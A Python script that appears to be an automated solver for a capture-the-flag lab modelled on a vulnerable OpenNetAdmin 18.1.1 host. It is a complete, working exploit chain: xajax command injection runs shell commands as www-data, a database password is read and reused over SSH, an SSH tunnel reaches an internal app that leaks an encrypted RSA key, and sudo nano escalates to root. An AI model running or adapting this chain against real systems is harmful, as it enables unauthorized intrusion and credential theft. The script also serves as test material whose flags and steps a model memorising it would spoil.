#!/usr/bin/env python3
"""Independent attacker for authentic OpenNetAdmin xajax RCE -> SSH pivot -> nano root."""
import os
import re
import socket
import subprocess
import tempfile
import time

import requests

BASE = os.environ.get("TARGET_URL", "http://openadmin-target").rstrip("/")
HOST = os.environ.get("TARGET_HOST", "openadmin-target")
EXPECTED_USER_FLAG = os.environ["EXPECTED_USER_FLAG"]
EXPECTED_ROOT_FLAG = os.environ["EXPECTED_ROOT_FLAG"]


def run(args, **kwargs):
    return subprocess.run(args, text=True, capture_output=True, timeout=kwargs.pop("timeout", 20), **kwargs)


def sshpass(password, command, key=None, passphrase=None, timeout=20):
    args = ["sshpass"]
    if passphrase is not None:
        args += ["-P", "Enter passphrase for key", "-p", passphrase]
    else:
        args += ["-p", password]
    args += ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
             "-o", "ConnectTimeout=8"]
    if key:
        args += ["-i", key, "-o", "PreferredAuthentications=publickey", "-o", "PubkeyAuthentication=yes"]
    args += [f"{'joanna' if key else 'jimmy'}@{HOST}", command]
    return run(args, timeout=timeout)


with socket.create_connection((HOST, 22), timeout=6) as sock:
    assert sock.recv(160).startswith(b"SSH-2.0-"), "OpenSSH banner missing"

page = requests.get(BASE + "/ona/", timeout=12)
assert page.status_code == 200 and "v18.1.1" in page.text, "OpenNetAdmin 18.1.1 not exposed"


def rce(command):
    form = 'ip=>;echo "BEGIN";{};echo "END"'.format(command)
    data = [
        ("xajax", "window_submit"),
        ("xajaxr", "1574117726710"),
        ("xajaxargs[]", "tooltips"),
        ("xajaxargs[]", form),
        ("xajaxargs[]", "ping"),
    ]
    response = requests.post(BASE + "/ona/", data=data, timeout=12)
    assert response.status_code == 200 and "BEGIN" in response.text and "END" in response.text
    return response.text.split("BEGIN", 1)[1].split("END", 1)[0]


identity = rce("id")
assert "uid=33(www-data)" in identity, identity[:500]
config = rce("cat /opt/ona/www/local/config/database_settings.inc.php")
assert "ona_sys" in config, "Real ONA database configuration was not read"
match = re.search(r"n1nj4W4rri0R!", config)
assert match, "Expected password reuse value not present in ONA database configuration"
jimmy_password = match.group(0)
print("PASS: original ONA xajax ws_ping RCE executes as www-data and exposes DB configuration", flush=True)

jimmy = sshpass(jimmy_password, "id -un")
assert jimmy.returncode == 0 and jimmy.stdout.strip() == "jimmy", jimmy.stderr
print("PASS: database credential reuse authenticates to native SSH as jimmy", flush=True)

tunnel = subprocess.Popen(
    ["sshpass", "-p", jimmy_password, "ssh", "-N", "-L", "52846:127.0.0.1:52846",
     "-o", "ExitOnForwardFailure=yes", "-o", "StrictHostKeyChecking=no",
     "-o", "UserKnownHostsFile=/dev/null", f"jimmy@{HOST}"],
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
)
try:
    ready = False
    for _ in range(30):
        try:
            with socket.create_connection(("127.0.0.1", 52846), timeout=1):
                ready = True
                break
        except OSError:
            time.sleep(1)
    assert ready, "SSH local forward did not expose the internal application"

    session = requests.Session()
    login = session.post(
        "http://127.0.0.1:52846/index.php",
        data={"username": "jimmy", "password": "Revealed"},
        allow_redirects=True, timeout=8,
    )
    assert login.status_code == 200
    internal = session.get("http://127.0.0.1:52846/main.php", timeout=8)
    assert internal.status_code == 200 and "Don't forget your" in internal.text
    key_match = re.search(
        r"<pre>\s*(-----BEGIN RSA PRIVATE KEY-----.*?-----END RSA PRIVATE KEY-----)\s*</pre>",
        internal.text, re.S,
    )
    assert key_match, "Internal application did not disclose Joanna's encrypted private key"

    with tempfile.TemporaryDirectory() as tmp:
        key_path = os.path.join(tmp, "joanna_id_rsa")
        with open(key_path, "w") as key_file:
            key_file.write(key_match.group(1) + "\n")
        os.chmod(key_path, 0o600)

        joanna = sshpass(None, "id -un; cat /home/joanna/user.txt", key=key_path,
                         passphrase="bloodninjas")
        assert joanna.returncode == 0 and "joanna" in joanna.stdout, joanna.stderr
        assert EXPECTED_USER_FLAG in joanna.stdout, "Exact per-instance User Flag mismatch"
        print("PASS: SSH tunnel -> internal SHA-512 login -> Joanna RSA key -> exact User Flag", flush=True)

        exp_script = "/tests/nano-root.exp"
        nano = run(["expect", exp_script, key_path, HOST], timeout=25)
        # Nano 2.9 closes the SSH channel immediately after its command prompt exits.
        # Root proof files are the independent success condition.
        proof = sshpass(None, "cat /tmp/openadmin-root-proof; cat /tmp/openadmin-root-flag-proof",
                        key=key_path, passphrase="bloodninjas")
        assert proof.returncode == 0 and "uid=0(root)" in proof.stdout, (
            nano.stdout[-1000:], nano.stderr[-1000:], proof.stdout, proof.stderr
        )
        assert EXPECTED_ROOT_FLAG in proof.stdout, "Exact per-instance Root Flag mismatch"
        print("PASS: native sudo nano command prompt executes as UID 0 and returns exact Root Flag", flush=True)
finally:
    tunnel.terminate()
    try:
        tunnel.wait(timeout=3)
    except subprocess.TimeoutExpired:
        tunnel.kill()
